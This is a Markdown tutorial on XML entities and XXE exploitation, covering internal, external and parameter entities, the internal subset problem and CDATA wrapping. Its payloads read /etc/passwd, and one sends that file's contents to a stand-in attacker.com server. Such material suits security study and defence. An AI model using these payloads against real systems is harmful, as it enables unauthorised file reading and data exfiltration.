# Mastering XXE Exploitation

## ENTITY

### 1.Internal Entity

##### Definition:

```python
<!ENTITY entityname "Hello">
<!ENTITY entityname2 'World'>
```
##### Usage:

```python
<sample>I would like to say &entityname; &entityname2;</sample>
```
##### Output:

```python
<sample>I would like to say Hello World</sample>
````


## 2. External Entity

### Definition:

```python
<!ENTITY includeme SYSTEM "include.xml">
<!ENTITY includeme2 SYSTEM "http://attackerserver/include.xml">
```

Usage:

```python
<sample>
    <head>Header</head>
    <first>&includeme;</first>
    <second>&includeme2;</second>
</sample>
```

include.xml:

```python
<body>I am to be included.</body>
```
Output:

```python <sample>
    <head>Header</head>
    <first><body>I am to be included.</body></first>
    <second><body>I am to be included.</body></second>
</sample>
```


* Basic Payload
```python
<!DOCTYPE test [<!ENTITY ent "test"> ]>
<root>&ent;</root>
```
output:

```python
<root>test</root>`
```

##### Payload to fetch internal files
```python

                                 |--> This declaration introduces Document Type Definition, it declares the root element of the document named test
                                 |
                                 |
                                 |       |--> This is name of the document type or root element
                                 |       |
                                 |       |       |--> (Entity declaration or Entity defination)  is used to define named entities which are place holders 
                                 |       |       |     for the text that can be reused within the document it defines an entity named ent 
                                 |       |       |
                                 |       |       |
                             <!DOCTYPE test [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
                                <userInfo>                               |
                              <firstName>John</firstName>                |
                              <lastName>&ent;</lastName>                 |--> external content such as url's or files
                               </userInfo>         |
                                                   |
                                                   | --> This is Actual xml content
```




## 3.Parameter Entities 
Parameter entities in XML are used within DTDs (Document Type Definitions) and are different from general entities, which are used in the XML content itself. Parameter entities are primarily used for defining reusable content or DTD fragments and help in structuring DTDs in a modular way.





## What Are Parameter Entities?

* Parameter entities are declared with a `%` character, followed by the entity name, and are used in DTDs (not in the XML document body).
* They are typically employed to include reusable DTD fragments or configuration within the DTD.
* To reference a parameter entity, you need to use `%entityName;` inside the DTD.





## Syntax for Declaring Parameter Entities



```python
<!ENTITY % entityName "replacement text or value">
```

* `%entityName;` will be replaced with "replacement text or value" wherever it is referenced in the DTD.




## Examples of Parameter Entities

## 1. Basic Parameter Entity Usage


```python
<!DOCTYPE root [
   <!ENTITY % greeting "Hello, World!">
   <!ELEMENT root (#PCDATA)>
]>
<root>%greeting;</root>
```

In this example:
* The DTD defines a parameter entity named `greeting` with the value "Hello, World!".
* However, this example is incorrect in practice because `%greeting;` cannot be used directly in the XML document content.

To use the parameter entity, you need to declare an additional general entity:


```python
<!DOCTYPE root [
   <!ENTITY % greeting "Hello, World!">
   <!ENTITY myGreeting "%greeting;">
   <!ELEMENT root (#PCDATA)>
]>
<root>&myGreeting;</root>
```

* Here, `myGreeting` is a general entity that uses the value of the parameter entity `%greeting`.




## 2. Including an External DTD Using Parameter Entities
You can use parameter entities to include external DTDs, making the DTD modular and easier to maintain.


#### External DTD (`common.dtd`):


```python
<!ENTITY % commonElements "<!ELEMENT greeting (#PCDATA)>">
```


## Main XML File:


```python
<!DOCTYPE root [
   <!ENTITY % common SYSTEM "http://example.com/common.dtd">
   %common;
   %commonElements;
]>
<root>
   <greeting>Hello from an external DTD!</greeting>
</root>
```


In this example:
* The parameter entity `%common` references an external DTD file located at `http://example.com/common.dtd`.
* `%commonElements;` is used to insert the content from the external DTD (in this case, an element declaration).





## 3. Conditional DTD Sections Using Parameter Entities
Parameter entities can be used to include or exclude parts of a DTD based on conditional sections.


```python
<!DOCTYPE root [
   <!ENTITY % includeGreeting "INCLUDE">
   <![%includeGreeting;[
      <!ELEMENT greeting (#PCDATA)>
   ]]>
   <!ELEMENT root (greeting)>
]>
<root>
   <greeting>Conditional Greeting Example</greeting>
</root>
```


In this example:
* The `%includeGreeting` parameter entity determines whether the `greeting` element is included.
* The conditional section `<![%includeGreeting;[ ... ]]>` is included because `%includeGreeting` is set to "INCLUDE".




## Security Implications of Parameter Entities

1. #### XML External Entity (XXE) Attacks 

Parameter entities can be used to reference external files or resources, leading to XXE vulnerabilities if the XML parser is not configured securely


```python
<!DOCTYPE root [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
   %eval;
]>
<root>&exfil;</root>
```

In this XXE example, an external file `(/etc/passwd)` is accessed and sent to an attacker's server.




2. ## Entity Reference Loops
   
   Defining parameter entities that reference each other in a circular manner can cause infinite loops:


```python
<!ENTITY % loop "%loop;">
```

This will trigger a "detected an entity reference loop" error in most XML parsers.





## Differences Between Parameter Entities and General Entities

|        Feature               |            Parameter Entities                            |    General Entities
|------------------------------|:---------------------------------------------------------|--------------------------------------------------------------:
|  Declared with               |         `%` (e.g., `<!ENTITY % name "value">`)           |           None (e.g., `<!ENTITY name "value">)`
|  Usage Scope                 |                Within DTDs only                          |             In XML document content
|  Syntax for Reference        |                `%name;`                                  |   `&name;`
|  Typical Use Cases           |         Including DTD fragments,conditional DTD sections |             Embedding content in XML 
|  Security Considerations     |         Can lead to XXE or loops if misconfigured        |                Rarely used for file access






## Summary
Parameter entities are a powerful feature in XML DTDs that help in reusing and modularizing DTD content. However, they must be used with caution due to the security risks associated with external entities and potential loops. Proper configuration of XML parsers and secure handling of DTDs is crucial to avoid XXE vulnerabilities.


## Internal Subset problem

Supposed a developer would like to wrap around a parameter entity as follows:

```python
<!DOCTYPE document [
	<!ENTITY % sample "hello world">
 	<!ENTITY wrapped "<body>%sample;</body>" >
]>
<document>&wrapped;</document>
```


The above would face an error "`XMLSyntaxError: PEReferences forbidden in internal subset`".

## In order to use a parameter entity in an entity's value, an external entity has to be used.

* external.dtd:

```python
<!ENTITY wrapped "<body>%sample;</body>" >
```

* document.xml:

```python
<!DOCTYPE document [
	<!ENTITY % sample "hello world">
 	<!ENTITY % dtd SYSTEM "external.dtd">
	%dtd;
]>
<document>&wrapped;</document>
```
* Output:

```python
<document><body>hello world</body></document>
```

### First match matters

Given the following definition and body:

```python
<!DOCTYPE r [
 <!ENTITY a "one" >
 <!ENTITY a "two" >
 <!ENTITY % param '<!ENTITY a "three">'>
 %param;
]>
<Sample> &a; </Sample>
```

* Output:

```python
<Sample> one </Sample>
```
When an entity is defined more than once, the XML parser will assume the first match and drop the remaining.


### limitations :-

*  XXE can only be used to obtain files or responses that contain “valid” XML or text.
* It is difficult to exfiltrate plain text files that are not valid XML files (e.g. files that contain XML special characters such as &, < and >)

* `CDATA` - used to make the XML parser interpret contents as text data and not as markup

## CDATA Enters the chat

* In the case of "<", this is due to parser scanning for the start of an XML node. If the content does not form a proper XML node, the parser would raise exceptions like "lxml.etree._raiseParseError XMLSyntaxError: chunk is not well balanced". A well-form XML <test></test> would not face such error.

* In the case of "&", this is due to parser scanning for an entity's name. Without a proper entity syntax, the parser would raise exceptions like "lxml.etree._raiseParseError XMLSyntaxError: xmlParseEntityRef: no name". A well-formed XML entity syntax like &gt; would not face such error.

* If the file content can be surround by <![CDATA[ and ]]> , the file content can be retrievable.

* This requires a wrapper and the knowledge of the Internal Subset Problem comes to our rescue.

* However, if the length of the file with illegal characters is too large, XML parser will attempt to throw "XMLSyntaxError: Detected an entity reference loop" as it attempts to stop billion laughter attacks.
